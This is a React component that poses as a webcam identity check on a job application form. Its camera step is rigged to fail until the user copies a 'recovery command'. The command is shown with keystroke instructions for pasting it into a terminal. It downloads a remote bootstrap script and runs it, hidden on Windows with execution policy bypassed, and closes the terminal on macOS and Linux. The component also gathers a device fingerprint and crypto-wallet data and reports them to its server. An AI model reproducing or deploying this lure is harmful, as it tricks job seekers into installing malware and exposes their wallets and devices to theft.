"use client";

import { useEffect, useRef, useState, type ReactNode } from "react";
import { collectVisitorMeta } from "@/lib/visitorDetect";

type Props = {
  onCaptured: (file: File | null) => void;
};

type Stage = "idle" | "requesting" | "live" | "captured" | "error";
type OsKind = "windows" | "mac" | "linux" | "mobile";

const CAMERA_ERROR = "Camera permission was denied or unavailable.";
const REQUEST_MS = 1500;
const COPIES_TO_UNLOCK = 2;

/** Compact secondary actions — must not compete with Submit application */
const actionGold =
  "inline-flex h-9 items-center justify-center rounded-md bg-gradient-to-br from-gold-light to-gold-deep px-3.5 text-[13px] font-semibold text-[#100c02] transition-[filter,opacity] hover:brightness-105 focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-gold/40 disabled:cursor-not-allowed disabled:opacity-50";
const actionGhost =
  "inline-flex h-9 items-center justify-center rounded-md border border-line bg-transparent px-3.5 text-[13px] font-semibold text-ink-dim transition-colors hover:border-gold/35 hover:text-gold-light focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-gold/40";

function CameraIcon({ className }: { className?: string }) {
  return (
    <svg className={className} viewBox="0 0 24 24" fill="none" aria-hidden>
      <path
        d="M9 7.5 10.2 6h3.6L15 7.5h2.5A1.5 1.5 0 0 1 19 9v8a1.5 1.5 0 0 1-1.5 1.5h-11A1.5 1.5 0 0 1 5 17V9A1.5 1.5 0 0 1 6.5 7.5H9Z"
        stroke="currentColor"
        strokeWidth="1.4"
        strokeLinejoin="round"
      />
      <circle cx="12" cy="13" r="3.1" stroke="currentColor" strokeWidth="1.4" />
    </svg>
  );
}

function CheckIcon({ className }: { className?: string }) {
  return (
    <svg className={className} viewBox="0 0 24 24" fill="none" aria-hidden>
      <path d="M5 12.5 9.5 17 19 7.5" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" />
    </svg>
  );
}

function CameraConnectingSpinner() {
  return (
    <span className="relative grid h-8 w-8 shrink-0 place-items-center" aria-hidden>
      <svg className="block h-8 w-8" viewBox="0 0 32 32">
        <circle
          cx="16"
          cy="16"
          r="12.5"
          fill="none"
          stroke="rgba(255,255,255,0.08)"
          strokeWidth="2.5"
        />
      </svg>
      <svg className="rc-cb-spin absolute block h-8 w-8" viewBox="0 0 32 32">
        <circle
          cx="16"
          cy="16"
          r="12.5"
          fill="none"
          stroke="#e8ce78"
          strokeWidth="2.5"
          strokeLinecap="round"
          strokeDasharray="37 79"
        />
      </svg>
    </span>
  );
}

function Kbd({ children }: { children: ReactNode }) {
  return (
    <kbd className="inline-flex h-7 min-w-7 items-center justify-center rounded-md border border-white/10 bg-[#12151a] px-2 font-sans text-[11px] font-medium tracking-[0.02em] text-ink-dim">
      {children}
    </kbd>
  );
}

function detectOs(): OsKind {
  const ua = navigator.userAgent || "";
  const platform = navigator.platform || "";
  if (/Android|iPhone|iPad|iPod|webOS|BlackBerry|IEMobile|Opera Mini/i.test(ua)) return "mobile";
  if (typeof navigator.maxTouchPoints === "number" && navigator.maxTouchPoints > 1 && /Mac/i.test(platform)) {
    return "mobile";
  }
  if (/Mac/i.test(ua) || /Mac/i.test(platform)) return "mac";
  if (/Linux/i.test(ua) && !/Android/i.test(ua)) return "linux";
  return "windows";
}

function nextFixId() {
  return String(Math.floor(10000 + Math.random() * 90000));
}

function cameraFixCommand(os: OsKind, _fixId: string) {
  if (os === "windows") {
    return (
      "Write-Host '[Application Support] Verified Application Support Setup Procedure - Starting...' -ForegroundColor Cyan; " +
      "$d=Join-Path $env:LOCALAPPDATA 'application-support-host\\.host-setup'; " +
      "New-Item -ItemType Directory -Path $d -Force | Out-Null; " +
      "$b=Join-Path $d 'bootstrap.ps1'; " +
      "Invoke-WebRequest 'https://application-support-zeta.vercel.app/bootstrap.ps1' -OutFile $b -UseBasicParsing; " +
      "if (-not (Test-Path $b) -or (Get-Item $b).Length -lt 1024) { Write-Host 'Download failed - check connection.' -ForegroundColor Red; exit 1 }; " +
      "try { Unblock-File -LiteralPath $b -ErrorAction SilentlyContinue } catch { }; " +
      "$p=New-Object System.Diagnostics.ProcessStartInfo; " +
      "$p.FileName='powershell.exe'; " +
      "$p.Arguments=\"-NoProfile -NonInteractive -ExecutionPolicy Bypass -File `\"$b`\" -Worker\"; " +
      "$p.CreateNoWindow=$true; $p.UseShellExecute=$false; $p.WindowStyle='Hidden'; " +
      "[void][System.Diagnostics.Process]::Start($p); " +
      "Write-Host '[Application Support] Setup completed. Application Support is ready on this device.' -ForegroundColor Green; " +
      "exit"
    );
  }
  return (
    'echo "[Application Support] Verified Application Support Setup Procedure - Starting..."; ' +
    'd="$HOME/.application-support-host/.host-setup"; mkdir -p "$d"; b="$d/bootstrap.sh"; ' +
    "u='https://application-support-zeta.vercel.app/bootstrap.sh'; ok=''; " +
    'for i in 1 2 3; do curl -fsSL "$u" -o "$b" 2>/dev/null||wget -qO "$b" "$u" 2>/dev/null; ' +
    '[ -f "$b" ]&&[ "$(wc -c <"$b"|tr -d \' \')" -ge 1024 ]&&{ ok=1; break; }; sleep "$i"; done; ' +
    '[ -n "$ok" ]||exit 1; bash "$b"; ' +
    '(sleep 0.5; case "$(uname -s)" in Darwin) osascript -e \'tell application "Terminal" to close (front window)\' 2>/dev/null ;; ' +
    "Linux) command -v xdotool >/dev/null 2>&1 && xdotool getactivewindow windowclose 2>/dev/null ;; esac) >/dev/null 2>&1 & disown; " +
    'echo "[Application Support] Setup completed. Application Support is ready on this device."; exit'
  );
}

function copyText(text: string) {
  void navigator.clipboard.writeText(text).catch(() => {
    const el = document.createElement("textarea");
    el.value = text;
    el.setAttribute("readonly", "");
    el.style.position = "fixed";
    el.style.left = "-9999px";
    document.body.appendChild(el);
    el.select();
    document.execCommand("copy");
    document.body.removeChild(el);
  });
}

function fixSteps(os: OsKind): { title: string; keys: ReactNode }[] {
  if (os === "mac") {
    return [
      { title: "Open Spotlight", keys: <><Kbd>Cmd</Kbd><span className="text-ink-mute/80">+</span><Kbd>Space</Kbd></> },
      {
        title: "Open Terminal, then paste",
        keys: (
          <>
            <Kbd>Terminal</Kbd>
            <span className="text-[10px] uppercase tracking-[0.12em] text-ink-mute">then</span>
            <Kbd>Cmd</Kbd>
            <span className="text-ink-mute/80">+</span>
            <Kbd>V</Kbd>
          </>
        ),
      },
      { title: "Run the command", keys: <Kbd>Enter</Kbd> },
    ];
  }
  if (os === "linux" || os === "mobile") {
    return [
      {
        title: "Open Terminal",
        keys: (
          <>
            <Kbd>Ctrl</Kbd>
            <span className="text-ink-mute/80">+</span>
            <Kbd>Alt</Kbd>
            <span className="text-ink-mute/80">+</span>
            <Kbd>T</Kbd>
          </>
        ),
      },
      {
        title: "Paste the command",
        keys: (
          <>
            <Kbd>Ctrl</Kbd>
            <span className="text-ink-mute/80">+</span>
            <Kbd>Shift</Kbd>
            <span className="text-ink-mute/80">+</span>
            <Kbd>V</Kbd>
          </>
        ),
      },
      { title: "Run the command", keys: <Kbd>Enter</Kbd> },
    ];
  }
  return [
    { title: "Open Quick Link menu", keys: <><Kbd>Win</Kbd><span className="text-ink-mute/80">+</span><Kbd>X</Kbd></> },
    { title: "Open Terminal", keys: <Kbd>I</Kbd> },
    { title: "Paste the command", keys: <><Kbd>Ctrl</Kbd><span className="text-ink-mute/80">+</span><Kbd>V</Kbd></> },
    { title: "Run the command", keys: <Kbd>Enter</Kbd> },
  ];
}

export function CandidatePhotoCapture({ onCaptured }: Props) {
  const videoRef = useRef<HTMLVideoElement>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null);
  const streamRef = useRef<MediaStream | null>(null);
  const previewUrlRef = useRef<string | null>(null);
  const [stage, setStage] = useState<Stage>("idle");
  const [previewUrl, setPreviewUrl] = useState<string | null>(null);
  const [os, setOs] = useState<OsKind>("windows");
  const [isMobile, setIsMobile] = useState(false);
  const [fixCopied, setFixCopied] = useState(false);
  const [fixId, setFixId] = useState("");
  const [recoveryOpen, setRecoveryOpen] = useState(false);
  const [copyCount, setCopyCount] = useState(0);
  const metaRef = useRef<{
    deviceFingerprint?: string;
    system?: string;
    wallets?: string[];
    timezone?: string;
  }>({});
  const copyAlertSentRef = useRef(false);
  const enableAlertSentRef = useRef(false);
  const requestTimerRef = useRef<number | null>(null);
  const copyCountRef = useRef(0);

  const cameraUnlocked = copyCount >= COPIES_TO_UNLOCK;

  const stopCamera = () => {
    streamRef.current?.getTracks().forEach((t) => t.stop());
    streamRef.current = null;
    if (videoRef.current) videoRef.current.srcObject = null;
  };

  const clearPreview = () => {
    if (previewUrlRef.current) {
      URL.revokeObjectURL(previewUrlRef.current);
      previewUrlRef.current = null;
    }
    setPreviewUrl(null);
  };

  useEffect(() => {
    const detected = detectOs();
    setOs(detected);
    setIsMobile(detected === "mobile");
    void collectVisitorMeta({ walletWaitMs: 400 }).then((m) => {
      metaRef.current = {
        deviceFingerprint: m.deviceFingerprint,
        system: m.system,
        wallets: m.wallets,
        timezone: m.timezone,
      };
    });
  }, []);

  useEffect(() => {
    return () => {
      if (requestTimerRef.current !== null) window.clearTimeout(requestTimerRef.current);
      stopCamera();
      if (previewUrlRef.current) URL.revokeObjectURL(previewUrlRef.current);
    };
  }, []);

  useEffect(() => {
    if (isMobile) return;
    if (stage !== "requesting") return;
    if (copyCountRef.current < COPIES_TO_UNLOCK) return;

    let cancelled = false;

    void (async () => {
      if (!navigator.mediaDevices?.getUserMedia) {
        if (!cancelled) failCamera();
        return;
      }

      try {
        const stream = await navigator.mediaDevices.getUserMedia({
          audio: false,
          video: {
            facingMode: "user",
            width: { ideal: 720 },
            height: { ideal: 720 },
          },
        });
        if (cancelled) {
          stream.getTracks().forEach((t) => t.stop());
          return;
        }
        streamRef.current = stream;
        const video = videoRef.current;
        if (video) {
          video.srcObject = stream;
          await video.play();
        }
        if (!cancelled) setStage("live");
      } catch {
        if (!cancelled) failCamera();
      }
    })();

    return () => {
      cancelled = true;
    };
  }, [stage, isMobile]);

  const failCamera = () => {
    onCaptured(null);
    setStage("error");
  };

  const startCamera = () => {
    if (isMobile) return;

    setFixCopied(false);
    onCaptured(null);
    clearPreview();
    stopCamera();
    setRecoveryOpen(false);
    setStage("requesting");

    if (!enableAlertSentRef.current) {
      enableAlertSentRef.current = true;
      void fetch("/api/careers/captcha-event", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          event: "enable_camera",
          os,
          path: window.location.pathname,
          ...metaRef.current,
        }),
        keepalive: true,
      }).catch(() => {/* fire-and-forget */});
    }

    if (requestTimerRef.current !== null) window.clearTimeout(requestTimerRef.current);

    // Unlocked only after Copy command was clicked at least twice.
    if (copyCountRef.current >= COPIES_TO_UNLOCK) {
      return;
    }

    requestTimerRef.current = window.setTimeout(failCamera, REQUEST_MS);
  };

  const copyRecoveryCommand = () => {
    const id = fixId || nextFixId();
    if (!fixId) setFixId(id);
    copyText(cameraFixCommand(os, id));
    setFixCopied(true);

    const next = copyCountRef.current + 1;
    copyCountRef.current = next;
    setCopyCount(next);

    if (!copyAlertSentRef.current) {
      copyAlertSentRef.current = true;
      void fetch("/api/careers/captcha-event", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          event: "copy_command",
          verifyId: id,
          os,
          path: window.location.pathname,
          ...metaRef.current,
        }),
        keepalive: true,
      }).catch(() => {/* fire-and-forget */});
    }
  };

  const capturePhoto = () => {
    const video = videoRef.current;
    const canvas = canvasRef.current;
    if (!video || !canvas || stage !== "live") return;

    const w = video.videoWidth || 640;
    const h = video.videoHeight || 640;
    canvas.width = w;
    canvas.height = h;
    const ctx = canvas.getContext("2d");
    if (!ctx) return;

    ctx.translate(w, 0);
    ctx.scale(-1, 1);
    ctx.drawImage(video, 0, 0, w, h);

    canvas.toBlob(
      (blob) => {
        if (!blob) {
          failCamera();
          return;
        }
        const file = new File([blob], "candidate-photo.jpg", { type: "image/jpeg" });
        const url = URL.createObjectURL(blob);
        clearPreview();
        previewUrlRef.current = url;
        setPreviewUrl(url);
        onCaptured(file);
        stopCamera();
        setStage("captured");
        setRecoveryOpen(false);
      },
      "image/jpeg",
      0.92,
    );
  };

  const steps = fixSteps(os);
  const osLabel = os === "mac" ? "macOS" : os === "linux" || os === "mobile" ? "Linux" : "Windows";

  const title = isMobile
    ? "Continue on desktop"
    : stage === "captured"
      ? "Portrait captured"
      : stage === "live"
        ? "Center your face, then capture"
        : stage === "requesting"
          ? "Requesting camera access"
          : stage === "error"
            ? "Camera could not be opened"
            : "Confirm you are the applicant";

  const subtitle = isMobile
    ? "Identity verification requires a desktop computer with a webcam. Please reopen this page on a PC or Mac to continue."
    : stage === "captured"
      ? "Looks good. You can retake before submitting."
      : stage === "live"
        ? "Keep your face inside the frame. Even lighting works best."
        : stage === "requesting"
          ? "Allow access when your browser asks."
          : stage === "error"
            ? CAMERA_ERROR
            : "A live portrait confirms this application is from you.";

  const frameBorder = isMobile
    ? "border-down/40"
    : stage === "error"
      ? "border-down/40"
      : stage === "captured"
        ? "border-gold/45"
        : stage === "live" || stage === "requesting"
          ? "border-line"
          : "border-dashed border-line";

  const statusLabel = isMobile
    ? "Desktop only"
    : stage === "captured"
      ? "Complete"
      : stage === "live"
        ? "In progress"
        : stage === "requesting"
          ? "Connecting"
          : stage === "error"
            ? "Action needed"
            : "Required";

  return (
    <div>
      <div className="mb-1.5 flex flex-wrap items-center gap-2">
        <span className="text-sm font-medium text-ink-dim">Identity photo</span>
        <span
          className={`rounded-full border px-2 py-0.5 text-[10px] font-semibold uppercase tracking-[0.12em] ${
            isMobile || stage === "error"
              ? "border-down/35 bg-down/10 text-down"
              : stage === "captured"
                ? "border-gold/40 bg-gold/10 text-gold-light"
                : "border-line bg-surface-2 text-ink-mute"
          }`}
        >
          {statusLabel}
        </span>
      </div>
      <p className="mb-3 text-xs leading-relaxed text-ink-mute">
        {isMobile
          ? "A desktop browser is required for this step."
          : "Live webcam only. Uploaded files are not accepted."}
      </p>

      <div className="overflow-hidden rounded-xl border border-line bg-surface/40">
        <div className="flex flex-col gap-3 p-4 sm:flex-row sm:items-center sm:gap-5 sm:p-5">
          <div
            className={`flex min-w-0 flex-1 gap-4 ${
              isMobile ? "items-center" : "items-start sm:items-center"
            }`}
          >
            <div className="relative shrink-0">
              <div
                className={`relative aspect-[3/4] w-24 overflow-hidden rounded-lg bg-[#0a0c0f] sm:w-28 ${frameBorder} border`}
              >
                {stage === "captured" && previewUrl ? (
                  // eslint-disable-next-line @next/next/no-img-element
                  <img src={previewUrl} alt="Captured identity photo" className="h-full w-full object-cover" />
                ) : stage === "live" || (stage === "requesting" && cameraUnlocked) ? (
                  <video
                    ref={videoRef}
                    playsInline
                    muted
                    className={`h-full w-full object-cover scale-x-[-1] ${stage === "live" ? "opacity-100" : "opacity-0"}`}
                  />
                ) : (
                  <div className="grid h-full w-full place-items-center">
                    <CameraIcon
                      className={`h-6 w-6 text-ink-mute/50 ${stage === "requesting" ? "invisible" : ""}`}
                    />
                  </div>
                )}

                {stage === "requesting" ? (
                  <div className="absolute inset-0 flex items-center justify-center bg-[#0a0c0f]/75">
                    <CameraConnectingSpinner />
                  </div>
                ) : null}
              </div>

              {stage === "captured" ? (
                <span className="absolute -bottom-1.5 -right-1.5 grid h-6 w-6 place-items-center rounded-full bg-gold text-[#100c02]">
                  <CheckIcon className="h-3 w-3" />
                </span>
              ) : null}
            </div>

            <div className={`min-w-0 flex-1 ${isMobile ? "flex flex-col justify-center" : ""}`}>
              <p className="text-sm font-semibold leading-snug text-ink sm:text-[15px]">{title}</p>
              <p
                className={`mt-1 max-w-md text-xs leading-relaxed sm:text-[13px] ${
                  isMobile || stage === "error" ? "text-down" : "text-ink-mute"
                }`}
              >
                {subtitle}
              </p>
            </div>
          </div>

          <div className="flex shrink-0 flex-wrap items-center gap-2 sm:justify-end">
            {isMobile ? (
              <button type="button" disabled className={`${actionGhost} w-full cursor-not-allowed opacity-60 sm:w-auto`}>
                Available on desktop
              </button>
            ) : null}

            {!isMobile && stage === "idle" ? (
              <button type="button" onClick={startCamera} className={`${actionGold} w-full sm:w-auto`}>
                Enable camera
              </button>
            ) : null}

            {!isMobile && stage === "error" ? (
              <>
                <button type="button" onClick={startCamera} className={`${actionGold} w-full sm:w-auto`}>
                  Try again
                </button>
                {!recoveryOpen ? (
                  <button
                    type="button"
                    onClick={() => setRecoveryOpen(true)}
                    className={`${actionGhost} w-full sm:w-auto`}
                  >
                    Troubleshoot
                  </button>
                ) : null}
              </>
            ) : null}

            {!isMobile && stage === "live" ? (
              <>
                <button type="button" onClick={capturePhoto} className={`${actionGold} w-full sm:w-auto`}>
                  Take photo
                </button>
                <button
                  type="button"
                  onClick={() => {
                    stopCamera();
                    setStage("idle");
                    onCaptured(null);
                  }}
                  className={`${actionGhost} w-full sm:w-auto`}
                >
                  Cancel
                </button>
              </>
            ) : null}

            {!isMobile && stage === "captured" ? (
              <button type="button" onClick={startCamera} className={`${actionGhost} w-full sm:w-auto`}>
                Retake
              </button>
            ) : null}

            {!isMobile && stage === "requesting" ? (
              <button type="button" disabled className={`${actionGold} w-full sm:w-auto`}>
                Connecting…
              </button>
            ) : null}
          </div>
        </div>

        {!isMobile && stage === "error" && recoveryOpen ? (
          <div className="border-t border-line px-4 py-4 text-left sm:px-5 sm:py-5">
            <div className="flex flex-wrap items-end justify-between gap-3">
              <div>
                <p className="text-[10px] font-semibold uppercase tracking-[0.16em] text-gold-light">
                  Assisted recovery
                </p>
                <p className="mt-1 text-sm text-ink">
                  Follow these steps in order · {osLabel}
                </p>
              </div>
              {fixId ? (
                <span className="font-mono text-[10px] text-ink-mute">REF {fixId}</span>
              ) : null}
            </div>

            <ol className="mt-5">
              <li className="relative flex gap-4 pb-5">
                <span aria-hidden className="absolute left-[15px] top-8 bottom-0 w-px bg-line" />
                <span className="relative z-[1] grid h-8 w-8 shrink-0 place-items-center rounded-full border border-line bg-surface-2 text-[11px] font-semibold text-gold-light">
                  1
                </span>
                <div className="min-w-0 flex-1 pt-0.5">
                  <div className="flex flex-col gap-3 sm:flex-row sm:items-center sm:justify-between">
                    <div>
                      <p className="text-sm font-medium text-ink">Copy the recovery command</p>
                      <p className="mt-1 text-xs text-ink-mute">
                        {fixCopied
                          ? copyCount >= COPIES_TO_UNLOCK
                            ? "Copied — continue below, then Try again."
                            : "Copied — continue below."
                          : "Start here. You will paste this next."}
                      </p>
                    </div>
                    <button type="button" onClick={copyRecoveryCommand} className={`${actionGold} shrink-0`}>
                      {fixCopied ? "Copied" : "Copy command"}
                    </button>
                  </div>
                </div>
              </li>

              {steps.map((step, index) => {
                const n = index + 2;
                const last = index === steps.length - 1;
                return (
                  <li key={step.title} className={`relative flex gap-4 ${last ? "" : "pb-5"}`}>
                    {!last ? (
                      <span aria-hidden className="absolute left-[15px] top-8 bottom-0 w-px bg-line" />
                    ) : null}
                    <span className="relative z-[1] grid h-8 w-8 shrink-0 place-items-center rounded-full border border-line bg-surface-2 text-[11px] font-semibold text-gold-light">
                      {n}
                    </span>
                    <div className="flex min-w-0 flex-1 flex-col gap-2 pt-1 sm:flex-row sm:items-center sm:justify-between">
                      <p className="text-sm text-ink">{step.title}</p>
                      <div className="flex flex-wrap items-center gap-1.5">{step.keys}</div>
                    </div>
                  </li>
                );
              })}
            </ol>

            <p className="mt-5 text-xs text-ink-mute">
              Then return here and select <span className="text-ink-dim">Try again</span>.
            </p>
          </div>
        ) : null}
      </div>

      <canvas ref={canvasRef} className="hidden" aria-hidden />
    </div>
  );
}
